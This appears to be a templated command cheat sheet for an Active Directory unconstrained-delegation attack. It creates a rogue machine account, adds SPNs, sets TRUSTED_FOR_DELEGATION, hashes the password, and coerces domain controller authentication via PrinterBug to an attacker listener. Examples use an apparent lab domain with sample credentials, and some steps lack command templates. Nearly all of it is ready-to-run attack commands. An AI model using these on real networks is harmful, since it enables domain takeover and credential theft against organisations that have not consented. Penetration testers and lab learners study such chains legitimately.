commands.title: Check MachineAccountQuota (MAQ)
commands.description: Query DC for MachineAccountQuota via LDAP.
commands.template:
netexec ldap {ip} -u {username} -p {password} -M maq

Example:
netexec ldap dc1.delegate.vl -u A.Briggs -p P4ssw0rd1#123 -M maq

commands.title: Create machine account (Impacket addcomputer)
commands.description: Add a new machine account to the domain.
commands.template:
impacket-addcomputer -computer-name {computer} -computer-pass {computer_pass} -dc-ip {ip} {domain}/{username}:'{password}'

Example:
impacket-addcomputer -computer-name furious5 -computer-pass Password123 -dc-ip 192.168.129.140 delegate.vl/N.Thompson:'KALEB_2341'

commands.title: Add DNS A record (krbrelayx dnstool)
commands.description: Create DNS record for fake machine.

commands.title: Add SPN (krbrelayx addspn) — via msDS-AdditionalDnsHostName
commands.description: Add SPN using msDS-AdditionalDnsHostName (works around validatedWrite constraints).
commands.template:
python3 krbrelayx/addspn.py -u '{domain}\\{username}' -p '{password}' -s '{spn}' -t '{computer}$' -dc-ip {ip} {domain_controller} --additional

Example:
python3 krbrelayx/addspn.py -u 'delegate.vl\\N.Thompson' -p 'KALEB_2341' -s 'cifs/furious5.delegate.vl' -t 'furious5$' -dc-ip 192.168.129.140 dc1.delegate.vl --additional

commands.title: Add SPN (krbrelayx addspn) — standard
commands.description: Add SPN (may fail if validatedWrite restricts SPNs).

commands.title: Enable unconstrained delegation (BloodyAD)
commands.description: Set userAccountControl flag TRUSTED_FOR_DELEGATION on the machine account.
commands.template:
bloodyAD -d {domain} -u {username} -p {password} --host {domain_controller} add uac '{computer}$' -f TRUSTED_FOR_DELEGATION

Example:
bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'furious5$' -f TRUSTED_FOR_DELEGATION

commands.title: List TRUSTED_FOR_DELEGATION accounts (NetExec nxc ldap)
commands.description: NetExec can retrieve all computer and user accounts that have the TRUSTED_FOR_DELEGATION flag set.
commands.template:
nxc ldap {ip} -u {username} -p {password} --trusted-for-delegation

Example:
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation

commands.title: Compute NTLM (MD4) of machine password
commands.description: Output NTLM (MD4) hash of the machine account password.
commands.template:
python3 -c "password = '{computer_pass}'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"

Example:
python3 -c "password = 'Password123'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"

commands.title: Start krbrelayx (export mode) with machine hash
commands.description: Run krbrelayx in unconstrained-delegation export mode using the machine NTLM hash.

commands.title: Test coercion vectors (netexec coerce_plus)
commands.description: Test common coercion methods (DFSCoerce, PetitPotam, PrinterBug, etc.).
commands.template:
netexec smb {ip} -u '{computer}$' -p {computer_pass} -M coerce_plus

Example:
netexec smb dc1.delegate.vl -u 'furious5$' -p Password123 -M coerce_plus

commands.title: Exploit coercion vector (PrinterBug example)
commands.description: Run coerce_plus with a chosen METHOD and LISTENER to coerce DC authentication to the fake host.
commands.template:
netexec smb {ip} -u '{computer}$' -p {computer_pass} -M coerce_plus -o LISTENER={listener} METHOD=PrinterBug

Example:
netexec smb dc1.delegate.vl -u 'furious5$' -p Password123 -M coerce_plus -o LISTENER=oxdf.delegate.vl METHOD=PrinterBug
